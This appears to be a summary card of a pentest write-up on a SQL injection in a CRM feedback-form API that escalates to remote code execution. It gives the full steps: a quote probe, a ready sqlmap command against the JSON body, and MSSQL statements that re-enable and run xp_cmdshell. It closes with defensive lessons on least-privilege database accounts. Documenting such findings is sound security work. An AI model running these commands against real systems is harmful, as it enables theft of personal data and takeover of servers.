# MSSQL feedback form: verbose error -> sqlmap dump -> xp_cmdshell RCE (CVSS 10)

- **Vuln type / sub-variant:** error-based SQLi escalated to OS RCE; MSSQL; unauthenticated
- **Target type:** a CRM's public feedback-form API; the JSON `text` field concatenated into a query
- **Recon signal:** an under-tested feedback endpoint ("just records text"); a single `'` in `text` returns a verbose MSSQL error
- **Root cause:** direct concatenation of input into SQL (CWE-89), plus verbose errors (CWE-209/200), plus the app's DB account having sysadmin/`sa` privileges (CWE-269)
- **Exploitation steps:**
  1. Confirm: `{"text":"'"}` -> HTTP 500 "Unclosed quotation mark after the character string" (confirms SQLi + leaks query structure).
  2. Enumerate/dump with sqlmap on the JSON body: `sqlmap -u .../api/feedback --data='{"name":"test","email":"test@test.com","text":"*"}' -H "Content-Type: application/json" --dbms="Microsoft SQL Server" --level=5 --risk=3` (the `*` marks the injection point). Reveals `sa` DBA, 9 databases, dumps PII and API keys.
  3. Escalate to RCE: `xp_cmdshell` was disabled, but the sysadmin context re-enabled it: `EXEC sp_configure 'show advanced options',1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC master..xp_cmdshell 'whoami';` -> OS command execution under the SQL Server service account.
- **Bypasses used:** `*` injection marker for a JSON body in sqlmap; privilege abuse to re-enable xp_cmdshell
- **Impact:** full DB compromise (PII: names/DOB/tax IDs/passports, production API keys) + OS RCE on the host; CVSS 10.0, scope change DB -> OS
- **Bounty:** not stated (pentest)
- **Lesson / pattern:** a verbose DB error is both confirmation and a schema map. SQLi -> RCE needs DB privilege: `xp_cmdshell` (MSSQL) is the path, and a sysadmin app account can re-enable it. Least-privilege DB accounts and a locked-down xp_cmdshell contain the blast radius even if the injection exists.
- **Source:**
  - Title: From MS SQL Injection to Remote Code Execution in a Production CRM
  - Author: Velstadt offensive security team
  - URL: https://velstadt.com/ms-sql-injection-to-rce-production-crm/
  - Date: 2026-05-20 (scraped 2026-11-19)
  - Raw file: `sources/sqli/19-velstadt-mssql-sqli-to-rce.md`

Tags: error-based, mssql, json-body, verbose-error, sqlmap, xp-cmdshell, rce, privilege-escalation, pii, full-db-dump, cvss-10, source-real
